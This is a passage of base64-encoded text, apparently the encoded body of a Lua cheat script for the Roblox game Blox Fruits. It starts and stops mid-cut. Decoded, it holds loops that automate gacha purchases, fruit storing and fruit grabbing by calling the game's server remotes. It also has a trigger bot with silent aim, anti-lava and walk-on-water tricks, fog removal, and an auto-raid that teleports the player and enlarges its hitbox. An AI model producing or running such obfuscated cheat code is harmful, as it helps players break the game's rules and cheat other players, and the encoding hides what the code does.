ICAgICAgIGVuZCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAtLSBTY2FuIHNwZWNpZmljIHpvbmVzIChPcHRpbWl6ZWQgdG8gcHJldmVudCBmcmVlemUpCiAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHpvbmVzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoLTUxOTEuMzcsIDE3Ny41MCwgLTU1MDMuOTEpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgVmVjdG9yMy5uZXcoOTEzLjE2LCAyNDkuMDksIDMyODY5LjIwKQogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHJhZGl1cyA9IDQwMDAgLS0gTGFyZ2UgcmFkaXVzIHRvIGNvdmVyIGlzbGFuZHMvZHVuZ2VvbnMKCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBfLCBjZW50ZXIgaW4gaXBhaXJzKHpvbmVzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgbm90IENvbmZpZy5BbnRpTGF2YSB0aGVuIGJyZWFrIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGFydHMgPSB3b3Jrc3BhY2U6R2V0UGFydEJvdW5kc0luUmFkaXVzKGNlbnRlciwgcmFkaXVzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIGksIHBhcnQgaW4gaXBhaXJzKHBhcnRzKSBkbwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCBDb25maWcuQW50aUxhdmEgdGhlbiBicmVhayBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkaXNhYmxlRGFtYWdlQmxvY2socGFydCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBpICUgNTAwID09IDAgdGhlbiB0YXNrLndhaXQoKSBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgLS0gTGlzdGVuIGZvciBuZXcgcGFydHMgKFN0cmVhbWluZ0VuYWJsZWQgLyBSYWlkcykKICAgICAgICAgICAgICAgICAgICBpZiBub3QgYW50aUxhdmFDb25uZWN0aW9uIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgYW50aUxhdmFDb25uZWN0aW9uID0gV29ya3NwYWNlLkRlc2NlbmRhbnRBZGRlZDpDb25uZWN0KGRpc2FibGVEYW1hZ2VCbG9jaykKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBpZiB3YXNFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgICAgICB3YXNFbmFibGVkID0gZmFsc2UKICAgICAgICAgICAgICAgICAgICBpZiBhbnRpTGF2YUNvbm5lY3Rpb24gdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBhbnRpTGF2YUNvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGFudGlMYXZhQ29ubmVjdGlvbiA9IG5pbAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gV0FMSyBPTiBXQVRFUiBMT09QCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCBwbGF0Zm9ybSA9IEluc3RhbmNlLm5ldygiUGFydCIpCiAgICAgICAgcGxhdGZvcm0uTmFtZSA9ICJXYXRlclBsYXRmb3JtIgogICAgICAgIHBsYXRmb3JtLlNpemUgPSBWZWN0b3IzLm5ldygyMCwgMSwgMjApCiAgICAgICAgcGxhdGZvcm0uVHJhbnNwYXJlbmN5ID0gMSAtLSBJbnZpc2libGUKICAgICAgICBwbGF0Zm9ybS5BbmNob3JlZCA9IHRydWUKICAgICAgICBwbGF0Zm9ybS5DYW5Db2xsaWRlID0gdHJ1ZQogICAgICAgIAogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLldhbGtXYXRlciBhbmQgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCB3YXRlclkgPSAtMS4zNgogICAgICAgICAgICAgICAgaWYgbWF0aC5hYnMocm9vdFBhcnQuUG9zaXRpb24uWSAtIHdhdGVyWSkgPCAyMCB0aGVuCiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm0uUGFyZW50ID0gd29ya3NwYWNlCiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm0uQ0ZyYW1lID0gQ0ZyYW1lLm5ldyhyb290UGFydC5Qb3NpdGlvbi5YLCB3YXRlclksIHJvb3RQYXJ0LlBvc2l0aW9uLlopCiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgcGxhdGZvcm0uUGFyZW50ID0gbmlsCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgcGxhdGZvcm0uUGFyZW50ID0gbmlsCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMC4wNSkKICAgICAgICBlbmQKICAgICAgICBpZiBwbGF0Zm9ybSB0aGVuIHBsYXRmb3JtOkRlc3Ryb3koKSBlbmQKICAgIGVuZCkKCiAgICAtLSBBVVRPIEdBQ0hBIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkF1dG9HYWNoYSB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBhcmdzID0gIkJ1eSIKICAgICAgICAgICAgICAgIGxvY2FsIG5wYyA9IG5pbAogICAgICAgICAgICAgICAgaWYgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJOUENzIikgdGhlbgogICAgICAgICAgICAgICAgICAgIG5wYyA9IHdvcmtzcGFjZS5OUENzOkZpbmRGaXJzdENoaWxkKCJCbG94IEZydWl0IEdhY2hhIikKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgbm90IG5wYyB0aGVuCiAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIHYuTmFtZSA9PSAiQmxveCBGcnVpdCBHYWNoYSIgb3Igdi5OYW1lID09ICJCbG94IEZydWl0IERlYWxlciBDb3VzaW4iIG9yIHYuTmFtZSA9PSAiWmlvbGVzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBucGMgPSB2CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBucGMgYW5kIHJvb3RQYXJ0IHRoZW4KICAgICAgICAgICAgICAgICAgICByb290UGFydC5DRnJhbWUgPSBucGMuSHVtYW5vaWRSb290UGFydC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsMCwzKQogICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjUpCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLlJlbW90ZXMuQ29tbUZfOkludm9rZVNlcnZlcigiQ291c2luIiwgIkJ1eSIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCg0KQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBBVVRPIFNUT1JFIEZSVUlUIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkF1dG9TdG9yZUZydWl0IHRoZW4KICAgICAgICAgICAgICAgIGZvciBfLCB0b29sIGluIHBhaXJzKHBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kICh0b29sLlRvb2xUaXAgPT0gIkJsb3ggRnJ1aXQiIG9yIHRvb2wuTmFtZTpmaW5kKCJGcnVpdCIpIG9yIHRvb2w6RmluZEZpcnN0Q2hpbGQoIkZydWl0TG9naWMiKSkgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJTdG9yZUZydWl0IiwgdG9vbDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTmFtZSIpIG9yICh0b29sLk5hbWU6Z3N1YigiIEZydWl0IiwgIiIpKSwgdG9vbCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgaWYgY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICBmb3IgXywgdG9vbCBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgaWYgdG9vbDpJc0EoIlRvb2wiKSBhbmQgKHRvb2wuVG9vbFRpcCA9PSAiQmxveCBGcnVpdCIgb3IgdG9vbC5OYW1lOmZpbmQoIkZydWl0Iikgb3IgdG9vbDpGaW5kRmlyc3RDaGlsZCgiRnJ1aXRMb2dpYyIpKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlJlcGxpY2F0ZWRTdG9yYWdlIikuUmVtb3Rlcy5Db21tRl86SW52b2tlU2VydmVyKCJTdG9yZUZydWl0IiwgdG9vbDpHZXRBdHRyaWJ1dGUoIk9yaWdpbmFsTmFtZSIpIG9yICh0b29sLk5hbWU6Z3N1YigiIEZydWl0IiwgIiIpKSwgdG9vbCkKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHRhc2sud2FpdCgxKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBBVVRPIEdSQUIgRlJVSVQgTE9PUAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBDb25maWcuQXV0b0dyYWJGcnVpdCBhbmQgY2hhcmFjdGVyIGFuZCByb290UGFydCB0aGVuCiAgICAgICAgICAgICAgICAtLSBTY2FuIGVudGlyZSBtYXAgKEdldERlc2NlbmRhbnRzKQogICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlOkdldERlc2NlbmRhbnRzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgdjpJc0EoIlRvb2wiKSBhbmQgKHYuVG9vbFRpcCA9PSAiQmxveCBGcnVpdCIgb3Igdi5OYW1lOmZpbmQoIkZydWl0IikpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgaGFuZGxlID0gdjpGaW5kRmlyc3RDaGlsZCgiSGFuZGxlIikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgaGFuZGxlIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkNGcmFtZSA9IGhhbmRsZS5DRnJhbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpcmV0b3VjaGludGVyZXN0KHJvb3RQYXJ0LCBoYW5kbGUsIDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmaXJldG91Y2hpbnRlcmVzdChyb290UGFydCwgaGFuZGxlLCAxKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWsgLS0gR3JhYiBvbmUgYnkgb25lIHRvIGF2b2lkIGNyYXNoCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoMSkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gTk8gQU5JTUFUSU9OIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLk5vQW5pbSBhbmQgaHVtYW5vaWQgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIHRyYWNrIGluIHBhaXJzKGh1bWFub2lkOkdldFBsYXlpbmdBbmltYXRpb25UcmFja3MoKSkgZG8KICAgICAgICAgICAgICAgICAgICBpZiB0cmFjay5Qcmlvcml0eSA9PSBFbnVtLkFuaW1hdGlvblByaW9yaXR5LklkbGUgb3IgdHJhY2suUHJpb3JpdHkgPT0gRW51bS5BbmltYXRpb25Qcmlvcml0eS5Nb3ZlbWVudCBvciB0cmFjay5Qcmlvcml0eSA9PSBFbnVtLkFuaW1hdGlvblByaW9yaXR5LkNvcmUgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICB0cmFjazpTdG9wKCkKICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICBlbmQKICAgIGVuZCkKICAgIAogICAgLS0gVFJJR0dFUiBCT1QgTE9PUAogICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgd2hpbGUgQ29uZmlnLklzUnVubmluZyBkbwogICAgICAgICAgICBpZiBDb25maWcuVHJpZ2dlckJvdCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBzaG91bGRTaG9vdCA9IGZhbHNlCiAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXRTY3JlZW5Qb3MgPSBuaWwKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgLS0gMS4gQ0hFQ0sgU0lMRU5UIEFJTSBUQVJHRVQgKElOIEZPVikKICAgICAgICAgICAgICAgIGlmIENvbmZpZy5TaWxlbnRBaW0gdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldCA9IGdldENsb3Nlc3RQbGF5ZXJUb01vdXNlKENvbmZpZy5TaWxlbnRGT1YsIHRydWUpCiAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0IGFuZCB0YXJnZXQuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdGFyZ2V0UGFydCA9IHRhcmdldC5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkhlYWQiKSBvciB0YXJnZXQuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGFyZ2V0UGFydCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzY3JlZW5Qb3MsIG9uU2NyZWVuID0gY2FtZXJhOldvcmxkVG9WaWV3cG9ydFBvaW50KHRhcmdldFBhcnQuUG9zaXRpb24pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBvblNjcmVlbiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvdWxkU2hvb3QgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFyZ2V0U2NyZWVuUG9zID0gVmVjdG9yMi5uZXcoc2NyZWVuUG9zLlgsIHNjcmVlblBvcy5ZKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZWxzZWlmIG5vdCBzaG91bGRTaG9vdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgLS0gMi4gQ0hFQ0sgTU9VU0UgVEFSR0VUIChGQUxMQkFDSykKICAgICAgICAgICAgICAgICAgICBsb2NhbCB0YXJnZXQgPSBtb3VzZS5UYXJnZXQKICAgICAgICAgICAgICAgICAgICBpZiB0YXJnZXQgYW5kIHRhcmdldC5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBtb2RlbCA9IHRhcmdldC5QYXJlbnQKICAgICAgICAgICAgICAgICAgICAgICAgaWYgbW9kZWwgfj0gY2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bSA9IG1vZGVsOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBodW0gYW5kIGh1bS5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCByb290ID0gbW9kZWw6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSBvciBtb2RlbDpGaW5kRmlyc3RDaGlsZCgiSGVhZCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgcm9vdCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocm9vdC5Qb3NpdGlvbiAtIGNhbWVyYS5DRnJhbWUuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDw9IENvbmZpZy5UcmlnZ2VyRGlzdGFuY2UgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2hvdWxkU2hvb3QgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIC0tIDQuIEZJUkUKICAgICAgICAgICAgICAgIGlmIHNob3VsZFNob290IHRoZW4KICAgICAgICAgICAgICAgICAgICBOdWNsZWFyQ2xpY2sodGFyZ2V0U2NyZWVuUG9zKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICB0YXNrLndhaXQoKQogICAgICAgIGVuZAogICAgZW5kKQogICAgCiAgICAtLSBSRU1PVkUgRk9HIExPT1AKICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLlJlbW92ZUZvZyB0aGVuCiAgICAgICAgICAgICAgICBMaWdodGluZy5Gb2dFbmQgPSA5ZTkKICAgICAgICAgICAgICAgIExpZ2h0aW5nLkZvZ1N0YXJ0ID0gOWU5CiAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhMaWdodGluZzpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICAgICAgICAgIGlmIHY6SXNBKCJBdG1vc3BoZXJlIikgdGhlbiB2OkRlc3Ryb3koKSBlbmQKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICAgICAgdGFzay53YWl0KDEpCiAgICAgICAgZW5kCiAgICBlbmQpCiAgICAKICAgIC0tIEFVVE8gUkFJRCBMT09QCiAgICB0YXNrLnNwYXduKGZ1bmN0aW9uKCkKICAgICAgICBsb2NhbCB3YXNBdXRvUmFpZCA9IGZhbHNlCiAgICAgICAgbG9jYWwgTGFzdFJhaWRUYXJnZXRUaW1lID0gMAogICAgICAgIAogICAgICAgIHdoaWxlIENvbmZpZy5Jc1J1bm5pbmcgZG8KICAgICAgICAgICAgaWYgQ29uZmlnLkF1dG9SYWlkIHRoZW4KICAgICAgICAgICAgICAgIHdhc0F1dG9SYWlkID0gdHJ1ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAtLSBFbmFibGUgQW50aSBMYXZhCiAgICAgICAgICAgICAgICBpZiBub3QgQ29uZmlnLkFudGlMYXZhIHRoZW4KICAgICAgICAgICAgICAgICAgICBDb25maWcuQW50aUxhdmEgPSB0cnVlCiAgICAgICAgICAgICAgICAgICAgaWYgVG9nZ2xlQnV0dG9uc1siQW50aUxhdmEiXSB0aGVuIFRvZ2dsZUJ1dHRvbnNbIkFudGlMYXZhIl0uQmFja2dyb3VuZENvbG9y" .. "MyA9IEN1cnJlbnRUaGVtZUNvbG9yIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICBpZiBjaGFyYWN0ZXIgYW5kIHJvb3RQYXJ0IGFuZCBodW1hbm9pZCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNsb3Nlc3QgPSBuaWwKICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgbWluRGlzdCA9IG1hdGguaHVnZQogICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBzY2FuUmFuZ2UgPSA1MDAwIC0tIEluY3JlYXNlZCBSYW5nZQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgaWYgd29ya3NwYWNlOkZpbmRGaXJzdENoaWxkKCJFbmVtaWVzIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIF8sIHYgaW4gcGFpcnMod29ya3NwYWNlLkVuZW1pZXM6R2V0Q2hpbGRyZW4oKSkgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB2OkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZCIpIGFuZCB2Lkh1bWFub2lkLkhlYWx0aCA+IDAgYW5kIHY6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGRpc3QgPSAocm9vdFBhcnQuUG9zaXRpb24gLSB2Lkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24pLk1hZ25pdHVkZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBkaXN0IDwgbWluRGlzdCBhbmQgZGlzdCA8IHNjYW5SYW5nZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBtaW5EaXN0ID0gZGlzdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2xvc2VzdCA9IHYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICBpZiBjbG9zZXN0IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIExhc3RSYWlkVGFyZ2V0VGltZSA9IG9zLmNsb2NrKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRhcmdldEhSUCA9IGNsb3Nlc3QuSHVtYW5vaWRSb290UGFydAogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBUUAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gdGFyZ2V0SFJQLkNGcmFtZSAqIENGcmFtZS5uZXcoMCwgMjAsIDApICogQ0ZyYW1lLkFuZ2xlcyhtYXRoLnJhZCgtOTApLCAwLCAwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAtLSBIaXRib3gKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LlNpemUgPSBWZWN0b3IzLm5ldygyNSwgMjUsIDI1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuVHJhbnNwYXJlbmN5ID0gMQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQ2FuQ29sbGlkZSA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIEVxdWlwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBFcXVpcFNlbGVjdGVkV2VhcG9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIHRvb2wgPSBjaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJUb29sIikKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCB0b29sIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbCBicCA9IHBsYXllci5CYWNrcGFjawogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGJwIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgdCA9IGJwOkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiVG9vbCIpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHQgdGhlbiBodW1hbm9pZDpFcXVpcFRvb2wodCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gQ2xpY2sKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRvb2wgdGhlbiB0b29sOkFjdGl2YXRlKCkgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBWaXJ0dWFsSW5wdXRNYW5hZ2VyOlNlbmRNb3VzZUJ1dHRvbkV2ZW50KGNhbWVyYS5WaWV3cG9ydFNpemUuWC8yLCBjYW1lcmEuVmlld3BvcnRTaXplLlkvMiwgMCwgdHJ1ZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFZpcnR1YWxJbnB1dE1hbmFnZXI6U2VuZE1vdXNlQnV0dG9uRXZlbnQoY2FtZXJhLlZpZXdwb3J0U2l6ZS5YLzIsIGNhbWVyYS5WaWV3cG9ydFNpemUuWS8yLCAwLCBmYWxzZSwgZ2FtZSwgMSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgPSBWZWN0b3IzLm5ldygwLDAsMCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgLS0gTm8gdGFyZ2V0IGZvdW5kOiBNb3ZlIEZvcndhcmQKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIG9zLmNsb2NrKCkgLSBMYXN0UmFpZFRhcmdldFRpbWUgPiA1IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBodW1hbm9pZC5QbGF0Zm9ybVN0YW5kID0gdHJ1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJvb3RQYXJ0LlZlbG9jaXR5ID0gVmVjdG9yMy5uZXcoMCwwLDApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQXNzZW1ibHlMaW5lYXJWZWxvY2l0eSA9IFZlY3RvcjMubmV3KDAsMCwwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC0tIE1vdmUgZm9yd2FyZCByZWxhdGl2ZSB0byBjaGFyYWN0ZXIgZmFjaW5nCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcm9vdFBhcnQuQ0ZyYW1lID0gcm9vdFBhcnQuQ0ZyYW1lICogQ0ZyYW1lLm5ldygwLCAwLCAtNSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgXywgdiBpbiBwYWlycyhjaGFyYWN0ZXI6R2V0RG